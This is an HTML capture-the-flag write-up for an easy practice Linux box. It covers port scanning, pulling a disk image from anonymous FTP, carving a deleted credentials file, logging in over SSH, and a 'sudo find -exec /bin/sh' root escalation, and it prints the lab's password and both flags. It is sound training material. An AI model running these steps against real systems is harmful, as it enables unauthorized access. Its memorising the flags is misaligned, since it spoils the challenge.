@@ -1,0 +1,378 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>recovery — Write-up</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Bricolage+Grotesque:opsz,wght@12..96,500;12..96,700;12..96,800&family=Figtree:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+/* ===================== palette ===================== */
+:root{
+  --bg:#e9f7ec; --bg2:#d8f3dc; --card:#fbfffc; --ink:#081c15; --muted:#2d6a4f;
+  --line:#b7e4c7; --accent:#0077b6; --accent2:#00b4d8;
+  --ok:#52b788; --ok2:#40916c; --bad:#ff4d6d; --bad-bg:#ffccd5;
+  --code-bg:#eaf8ee; --code-ink:#0b3d2e; --code-stripe:#0077b6;
+  --btn1:#1b4332; --btn2:#2d6a4f; --btn3:#0096c7;
+  --banner1:#081c15; --banner2:#1b4332; --banner3:#2d6a4f;
+  --shadow:0 10px 30px rgba(8,28,21,.08); --ring:rgba(0,119,182,.35);
+}
+@media (prefers-color-scheme:dark){ :root:not([data-theme="light"]){
+  --bg:#06140f; --bg2:#081c15; --card:#0e281d; --ink:#d8f3dc; --muted:#74c69d;
+  --line:#1b4332; --accent:#48cae4; --accent2:#90e0ef;
+  --ok:#52b788; --ok2:#40916c; --bad:#ff4d6d; --bad-bg:#590d22;
+  --code-bg:#06140f; --code-ink:#b7e4c7; --code-stripe:#48cae4;
+  --banner1:#030a07; --banner2:#06140f; --banner3:#0e281d;
+  --shadow:0 10px 30px rgba(0,0,0,.4); --ring:rgba(72,202,228,.4);
+}}
+:root[data-theme="dark"]{
+  --bg:#06140f; --bg2:#081c15; --card:#0e281d; --ink:#d8f3dc; --muted:#74c69d;
+  --line:#1b4332; --accent:#48cae4; --accent2:#90e0ef;
+  --ok:#52b788; --ok2:#40916c; --bad:#ff4d6d; --bad-bg:#590d22;
+  --code-bg:#06140f; --code-ink:#b7e4c7; --code-stripe:#48cae4;
+  --banner1:#030a07; --banner2:#06140f; --banner3:#0e281d;
+  --shadow:0 10px 30px rgba(0,0,0,.4); --ring:rgba(72,202,228,.4);
+}
+
+/* ===================== base ===================== */
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+@media (prefers-reduced-motion:reduce){ html{scroll-behavior:auto} }
+body{
+  margin:0; background:var(--bg); color:var(--ink);
+  font-family:"Figtree",system-ui,-apple-system,Segoe UI,Roboto,sans-serif;
+  line-height:1.6; -webkit-font-smoothing:antialiased;
+}
+h1,h2,h3,.badge-num{font-family:"Bricolage Grotesque","Figtree",system-ui,sans-serif;}
+a{color:var(--accent)}
+code,kbd{font-family:"SFMono-Regular",ui-monospace,Menlo,Consolas,monospace}
+
+/* ===================== header banner ===================== */
+header.banner{
+  position:relative; overflow:hidden; color:#eafff2;
+  background:linear-gradient(135deg,var(--banner1),var(--banner2) 55%,var(--banner3));
+  border-radius:0 0 28px 28px; padding:34px 20px 40px;
+}
+header.banner .circle{
+  position:absolute; right:-60px; top:-70px; width:260px; height:260px; border-radius:50%;
+  background:radial-gradient(circle at 35% 35%,var(--accent2),var(--accent)); opacity:.75;
+  filter:blur(1px);
+}
+header.banner .wrap{max-width:1180px; margin:0 auto; position:relative; z-index:1}
+header.banner .eyebrow{font-size:.8rem; letter-spacing:.14em; text-transform:uppercase; color:#95e8ff; margin:0 0 6px}
+header.banner h1{margin:0; font-size:clamp(1.7rem,4vw,2.6rem); font-weight:800; letter-spacing:-.01em}
+header.banner p{margin:10px 0 0; color:#cdeede; max-width:60ch}
+
+/* ===================== sticky topbar ===================== */
+.topbar{
+  position:sticky; top:0; z-index:40;
+  margin:10px auto 0; max-width:calc(780px + 16px); width:calc(100% - 24px);
+  background:color-mix(in srgb,var(--card) 88%,transparent);
+  backdrop-filter:blur(8px);
+  border:1px solid var(--line); border-radius:16px; box-shadow:var(--shadow);
+  padding:10px 14px; display:flex; align-items:center; gap:12px; flex-wrap:wrap;
+}
+.topbar .status{font-size:.9rem; font-weight:600; color:var(--muted); white-space:nowrap}
+.topbar .progress{flex:1 1 140px; height:8px; border-radius:99px; background:var(--bg2); overflow:hidden; min-width:120px}
+.topbar .progress>span{display:block; height:100%; width:0;
+  background:linear-gradient(90deg,var(--btn1),var(--btn2),var(--btn3)); transition:width .25s ease}
+.btn{
+  font:inherit; font-weight:600; cursor:pointer; color:#eafff2; border:0; border-radius:12px;
+  padding:8px 13px; background:linear-gradient(135deg,var(--btn1),var(--btn2) 55%,var(--btn3));
+  box-shadow:var(--shadow);
+}
+.btn.ghost{background:transparent; color:var(--muted); border:1px solid var(--line); box-shadow:none}
+.btn:focus-visible,a:focus-visible,.nav-step:focus-visible{outline:3px solid var(--ring); outline-offset:2px}
+
+/* ===================== layout ===================== */
+.shell{max-width:1180px; margin:26px auto 80px; padding:0 12px; position:relative}
+.content{max-width:780px; margin:0 auto}
+
+/* left side nav (wide only) */
+.side{display:none}
+@media (min-width:1180px){
+  .side{
+    display:block; position:fixed; top:96px; left:calc(50% - 590px); width:238px;
+  }
+  .content{margin-left:auto; margin-right:auto}
+}
+.side .panel{background:var(--card); border:1px solid var(--line); border-radius:18px; box-shadow:var(--shadow); padding:16px; margin-bottom:14px}
+.side h4{margin:0 0 10px; font-size:.78rem; letter-spacing:.12em; text-transform:uppercase; color:var(--muted)}
+.steps-grid{display:grid; grid-template-columns:repeat(5,1fr); gap:8px}
+.nav-step{
+  font:inherit; font-weight:700; cursor:pointer; aspect-ratio:1; border-radius:11px;
+  border:1px solid var(--line); background:var(--bg2); color:var(--ink);
+}
+.nav-step.active{outline:3px solid var(--ring); outline-offset:1px}
+.side .caption{margin-top:10px; font-size:.82rem; color:var(--muted); min-height:2.4em}
+.meta-row{display:flex; justify-content:space-between; gap:8px; font-size:.86rem; padding:5px 0; border-top:1px dashed var(--line)}
+.meta-row:first-of-type{border-top:0}
+.meta-row b{color:var(--muted); font-weight:600}
+.chip{display:inline-block; font-size:.74rem; font-weight:600; padding:2px 9px; border-radius:99px;
+  background:var(--bg2); border:1px solid var(--line); color:var(--muted); margin:2px 3px 0 0}
+
+/* ===================== cards ===================== */
+.card{
+  background:var(--card); border:1px solid var(--line); border-radius:20px;
+  box-shadow:var(--shadow); padding:22px 22px; margin:18px 0;
+}
+.card.intro p{margin:.4rem 0}
+.step-head{display:flex; align-items:center; gap:13px; margin:0 0 4px}
+.badge-num{
+  flex:none; width:38px; height:38px; border-radius:12px; display:grid; place-items:center;
+  font-weight:800; color:#eafff2; background:linear-gradient(135deg,var(--btn1),var(--btn3));
+}
+.step-head h2{margin:0; font-size:1.22rem}
+.card h3{margin:1.3rem 0 .4rem; font-size:1rem; color:var(--muted)}
+
+/* code blocks — light in light mode, dark only in dark mode */
+pre{
+  position:relative; margin:.6rem 0; padding:14px 42px 14px 16px; overflow:auto;
+  background:var(--code-bg); color:var(--code-ink);
+  border:1px solid var(--line); border-left:4px solid var(--code-stripe); border-radius:12px;
+  font-size:.86rem; line-height:1.5;
+}
+pre code{white-space:pre}
+p code,li code{background:var(--code-bg); color:var(--code-ink); padding:.08em .4em; border-radius:6px; font-size:.86em}
+.copy{
+  position:absolute; top:8px; right:8px; font:inherit; font-size:.72rem; font-weight:600;
+  cursor:pointer; border:1px solid var(--line); border-radius:8px; padding:3px 8px;
+  background:var(--card); color:var(--muted);
+}
+.copy.done{color:var(--ok2); border-color:var(--ok)}
+.ph{color:var(--accent); font-weight:700}
+
+/* "why it works" box */
+.why{margin-top:16px; background:var(--bg2); border:1px solid var(--line); border-radius:14px; padding:14px 16px}
+.why h4{margin:0 0 6px; font-size:.84rem; letter-spacing:.08em; text-transform:uppercase; color:var(--muted)}
+.why ol{margin:.2rem 0 0; padding-left:1.2rem}
+.why li{margin:.25rem 0}
+
+/* flag callouts */
+.flag{display:flex; align-items:center; gap:10px; flex-wrap:wrap; margin:.5rem 0;
+  padding:12px 14px; border-radius:12px; border:1px dashed var(--ok);
+  background:color-mix(in srgb,var(--ok) 12%,var(--card))}
+.flag .lbl{font-weight:700; color:var(--ok2)}
+.flag code{background:var(--card); border:1px solid var(--line); padding:.15em .5em; border-radius:7px}
+
+.footer{max-width:780px; margin:30px auto 0; color:var(--muted); font-size:.85rem; text-align:center}
+.skip{position:absolute; left:-999px}
+.skip:focus{left:12px; top:12px; z-index:100; background:var(--card); padding:8px 12px; border-radius:10px}
+</style>
+</head>
+<body>
+<a href="#s1" class="skip btn">Skip to walkthrough</a>
+
+<header class="banner">
+  <div class="circle" aria-hidden="true"></div>
+  <div class="wrap">
+    <p class="eyebrow">Practice Lab · Write-up</p>
+    <h1>recovery</h1>
+    <p>Easy Linux box. Service enumeration &rarr; forensic recovery of a deleted file &rarr; a <code>sudo</code> misconfiguration for root. Commands use <span class="ph">&lt;target-ip&gt;</span> — substitute the IP of your running box.</p>
+  </div>
+</header>
+
+<div class="topbar" role="region" aria-label="Progress">
+  <span class="status" id="status">Step 1 / 5</span>
+  <div class="progress" aria-hidden="true"><span id="bar"></span></div>
+  <button class="btn ghost" id="themeBtn" type="button">Switch to dark</button>
+</div>
+
+<div class="shell">
+  <!-- left nav: wide screens only -->
+  <aside class="side" aria-label="Section navigation">
+    <div class="panel">
+      <h4>Steps</h4>
+      <div class="steps-grid" id="navGrid"></div>
+      <div class="caption" id="navCaption">1 · Enumerate the services</div>
+    </div>
+    <div class="panel">
+      <h4>Machine</h4>
+      <div class="meta-row"><b>Level</b><span>Easy</span></div>
+      <div class="meta-row"><b>Flags</b><span>user + root</span></div>
+      <div class="meta-row"><b>Services</b><span>FTP · SSH · HTTP</span></div>
+      <div style="margin-top:10px">
+        <span class="chip">enumeration</span><span class="chip">forensics</span><span class="chip">privesc</span>
+      </div>
+    </div>
+  </aside>
+
+  <main class="content">
+    <section class="card intro" id="s0">
+      <p><b>Goal.</b> Capture two flags — a <b>user</b> flag and a <b>root</b> flag. On this box the user flag is not a plain file: it is recovered through <b>disk forensics</b>, which is the whole point of the first machine.</p>
+      <p><b>Scope.</b> Only attack the single IP you were given. Replace <span class="ph">&lt;target-ip&gt;</span> everywhere below.</p>
+    </section>
+
+    <!-- STEP 1 -->
+    <section class="card step" id="s1" data-title="Enumerate the services">
+      <div class="step-head"><span class="badge-num">1</span><h2>Enumerate the services</h2></div>
+      <p>Start with a full port scan and service/version detection.</p>
+      <pre><code>nmap -sC -sV -p- <span class="ph">&lt;target-ip&gt;</span></code></pre>
+      <p>Three services answer:</p>
+      <pre><code>21/tcp  ftp     vsftpd     (anonymous login allowed)
+22/tcp  ssh     OpenSSH
+80/tcp  http    Apache httpd</code></pre>
+      <div class="why">
+        <h4>Why it works</h4>
+        <ol>
+          <li><code>-p-</code> scans all 65535 ports so nothing hides on a high port.</li>
+          <li><code>-sV</code> fingerprints versions; <code>-sC</code> runs safe default scripts — the FTP script flags that <b>anonymous</b> login is enabled, which is your first lead.</li>
+        </ol>
+      </div>
+    </section>
+
+    <!-- STEP 2 -->
+    <section class="card step" id="s2" data-title="Pull the disk image">
+      <div class="step-head"><span class="badge-num">2</span><h2>Pull the disk image</h2></div>
+      <p>The web root advertises a decommissioned workstation backup. Grab it over HTTP (the same file is also on anonymous FTP):</p>
+      <pre><code>wget http://<span class="ph">&lt;target-ip&gt;</span>/disk_backup.img</code></pre>
+      <p>Or via FTP:</p>
+      <pre><code>ftp <span class="ph">&lt;target-ip&gt;</span>
+# user: anonymous   (press Enter for password)
+ftp&gt; get pub/disk_backup.img</code></pre>
+      <div class="why">
+        <h4>Why it works</h4>
+        <ol>
+          <li>A "backup" is rarely just data — disk images carry <b>deleted</b> files and leftover artifacts in unallocated space.</li>
+          <li>Anonymous FTP and an open directory are classic exposures: no credentials needed, so enumeration alone hands you the material.</li>
+        </ol>
+      </div>
+    </section>
+
+    <!-- STEP 3 -->
+    <section class="card step" id="s3" data-title="Recover the deleted file">
+      <div class="step-head"><span class="badge-num">3</span><h2>Recover the deleted file (forensics)</h2></div>
+      <p>The image once held a <code>credentials.txt</code> that was deleted. Deleting a file does not wipe its data blocks, so recover it. The quickest check:</p>
+      <pre><code>strings disk_backup.img | grep -iE 'FLAG|pass|ssh'</code></pre>
+      <p>Or carve it properly with any forensic tool:</p>
+      <pre><code>foremost -i disk_backup.img -o out/     # carves deleted files into out/
+# or
+photorec disk_backup.img                # interactive carver
+# or mount + undelete
+extundelete disk_backup.img --restore-all</code></pre>
+      <p>The recovered note contains the SSH credentials and the <b>user flag</b>:</p>
+      <pre><code>SSH : jdoe
+Pass: sunshine2019
+user flag: FLAG{f0r3ns1c_c4rv1ng_r3c0v3ry}</code></pre>
+      <div class="flag"><span class="lbl">USER FLAG</span><code>FLAG{f0r3ns1c_c4rv1ng_r3c0v3ry}</code></div>
+      <div class="why">
+        <h4>Why it works</h4>
+        <ol>
+          <li>On ext-family filesystems, <code>rm</code> only unlinks the directory entry and frees the inode — the <b>data blocks keep their contents</b> until overwritten.</li>
+          <li><code>strings</code> reads those raw bytes directly; carvers like <code>foremost</code>/<code>photorec</code> rebuild whole files from recognizable headers.</li>
+        </ol>
+      </div>
+    </section>
+
+    <!-- STEP 4 -->
+    <section class="card step" id="s4" data-title="Get a shell">
+      <div class="step-head"><span class="badge-num">4</span><h2>Get a shell</h2></div>
+      <p>Log in over SSH with the recovered credentials:</p>
+      <pre><code>ssh jdoe@<span class="ph">&lt;target-ip&gt;</span>
+# password: sunshine2019</code></pre>
+      <div class="why">
+        <h4>Why it works</h4>
+        <ol>
+          <li>Credentials dumped from "dead" storage are still live on the running system — password hygiene, not the disk, is the failure.</li>
+          <li>Password authentication over SSH is enabled, so recovered creds are enough for interactive access.</li>
+        </ol>
+      </div>
+    </section>
+
+    <!-- STEP 5 -->
+    <section class="card step" id="s5" data-title="Escalate to root">
+      <div class="step-head"><span class="badge-num">5</span><h2>Escalate to root</h2></div>
+      <p>Check what <code>jdoe</code> may run as root:</p>
+      <pre><code>sudo -l
+#   (root) NOPASSWD: /usr/bin/find</code></pre>
+      <p><code>find</code> can execute commands — abuse it to spawn a root shell (GTFOBins):</p>
+      <pre><code>sudo find . -exec /bin/sh \; -quit
+# id  ->  uid=0(root)
+cat /root/root.txt</code></pre>
+      <div class="flag"><span class="lbl">ROOT FLAG</span><code>FLAG{sud0_f1nd_g1v3s_r00t}</code></div>
+      <div class="why">
+        <h4>Why it works</h4>
+        <ol>
+          <li><code>sudo</code> runs <code>find</code> as root, and <code>-exec</code> launches a child process — that child inherits root.</li>
+          <li><code>-quit</code> stops after the first match so you drop straight into the shell instead of looping over the tree.</li>
+        </ol>
+      </div>
+    </section>
+
+    <section class="card" id="s6">
+      <h2 style="margin-top:0">Both flags</h2>
+      <div class="flag"><span class="lbl">user</span><code>FLAG{f0r3ns1c_c4rv1ng_r3c0v3ry}</code></div>
+      <div class="flag"><span class="lbl">root</span><code>FLAG{sud0_f1nd_g1v3s_r00t}</code></div>
+      <p style="margin-bottom:0"><b>Lesson.</b> "Deleting" a file is not erasing it, and decommissioned media must be wiped. Pair that with least-privilege <code>sudo</code> rules and this whole chain disappears.</p>
+    </section>
+
+    <p class="footer">recovery &middot; practice lab write-up &middot; replace <span class="ph">&lt;target-ip&gt;</span> with your box IP</p>
+  </main>
+</div>
+
+<script>
+(function(){
+  "use strict";
+  var root=document.documentElement;
+
+  /* theme toggle (not persisted, per spec) */
+  var btn=document.getElementById("themeBtn");
+  function current(){
+    var set=root.getAttribute("data-theme");
+    if(set) return set;
+    return window.matchMedia("(prefers-color-scheme:dark)").matches?"dark":"light";
+  }
+  function sync(){ btn.textContent = current()==="dark" ? "Switch to light" : "Switch to dark"; }
+  btn.addEventListener("click",function(){
+    root.setAttribute("data-theme", current()==="dark"?"light":"dark"); sync();
+  });
+  sync();
+
+  /* copy buttons on code blocks */
+  document.querySelectorAll("pre").forEach(function(pre){
+    var b=document.createElement("button");
+    b.className="copy"; b.type="button"; b.textContent="copy";
+    b.addEventListener("click",function(){
+      var t=pre.querySelector("code").innerText;
+      navigator.clipboard && navigator.clipboard.writeText(t).then(function(){
+        b.textContent="copied"; b.classList.add("done");
+        setTimeout(function(){b.textContent="copy"; b.classList.remove("done");},1400);
+      });
+    });
+    pre.appendChild(b);
+  });
+
+  /* build step nav + progress tracking */
+  var steps=[].slice.call(document.querySelectorAll("section.step"));
+  var grid=document.getElementById("navGrid");
+  var caption=document.getElementById("navCaption");
+  var status=document.getElementById("status");
+  var bar=document.getElementById("bar");
+  steps.forEach(function(s,i){
+    var a=document.createElement("button");
+    a.className="nav-step"; a.type="button"; a.textContent=(i+1);
+    a.setAttribute("aria-label","Go to step "+(i+1)+": "+s.dataset.title);
+    a.addEventListener("click",function(){ s.scrollIntoView({block:"start"}); });
+    grid.appendChild(a);
+  });
+  var navBtns=[].slice.call(grid.children);
+  function setActive(i){
+    navBtns.forEach(function(b,j){ b.classList.toggle("active", j===i); });
+    caption.textContent=(i+1)+" · "+steps[i].dataset.title;
+    status.textContent="Step "+(i+1)+" / "+steps.length;
+    bar.style.width=(((i+1)/steps.length)*100)+"%";
+  }
+  setActive(0);
+  if("IntersectionObserver" in window){
+    var io=new IntersectionObserver(function(ents){
+      ents.forEach(function(e){
+        if(e.isIntersecting){ var i=steps.indexOf(e.target); if(i>=0) setActive(i); }
+      });
+    },{rootMargin:"-45% 0px -50% 0px",threshold:0});
+    steps.forEach(function(s){ io.observe(s); });
+  }
+})();
+</script>
+</body>
+</html>
